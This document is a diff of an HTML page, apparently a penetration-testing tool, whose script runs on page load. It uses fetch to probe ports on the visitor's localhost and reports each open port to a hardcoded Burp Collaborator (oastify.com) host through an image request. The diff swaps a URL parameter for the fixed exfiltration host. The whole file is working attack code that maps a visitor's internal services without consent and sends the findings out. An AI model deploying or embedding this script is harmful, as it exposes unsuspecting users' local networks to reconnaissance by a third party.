@@ -1,31 +1,25 @@
+
 <!DOCTYPE html>
 <html>
 <head>
     <title>Port Scan and Ping Burp Collaborator</title>
     <script type="text/javascript">
-        // Function to get URL parameters
-        function getQueryParam(param) {
-            let urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(param);
-        }
-
-        async function scanPort(host, port, collaboratorUrl) {
+        async function scanPort(host, port) {
             try {
                 let url = `http://${host}:${port}`;
                 await fetch(url, { mode: 'no-cors' });
                 console.log(`Port ${port} is open`);
-                sendPing(port, collaboratorUrl);
+                sendPing(port);
                 return port;
             } catch (error) {
-                console.log(`Port ${port} is closed`);
                 return null; // Port is closed
             }
         }
 
-        async function scanPorts(host, ports, collaboratorUrl) {
+        async function scanPorts(host, ports) {
             let openPorts = [];
             for (let port of ports) {
-                let result = await scanPort(host, port, collaboratorUrl);
+                let result = await scanPort(host, port);
                 if (result) {
                     openPorts.push(result);
                 }
@@ -33,7 +27,8 @@
             return openPorts;
         }
 
-        function sendPing(port, collaboratorUrl) {
+        function sendPing(port) {
+            let collaboratorUrl = 'https://2dgamukyjo5hfkwg3rhbu0z82z8qwix6m.oastify.com';
             let pingUrl = `${collaboratorUrl}?port=${port}`;
             let img = new Image();
             img.src = pingUrl;
@@ -42,16 +37,8 @@
 
         document.addEventListener("DOMContentLoaded", function() {
             let host = '127.0.0.1'; // Replace with your target host
-            let ports = [80, 443, 9001, 8080, 3000, 22, 21, 378923]; // List of ports to scan
-            
-            // Retrieve the collaborator URL from the query parameters
-            let collaboratorUrl = getQueryParam('url');
-            if (!collaboratorUrl) {
-                console.error('No collaboratorUrl provided in the URL parameters');
-                return;
-            }
-
-            scanPorts(host, ports, collaboratorUrl).then(openPorts => {
+            let ports = [80, 443, 8080, 3000, 22, 21,378923]; // List of ports to scan
+            scanPorts(host, ports).then(openPorts => {
                 console.log("Open ports:", openPorts);
             });
         });
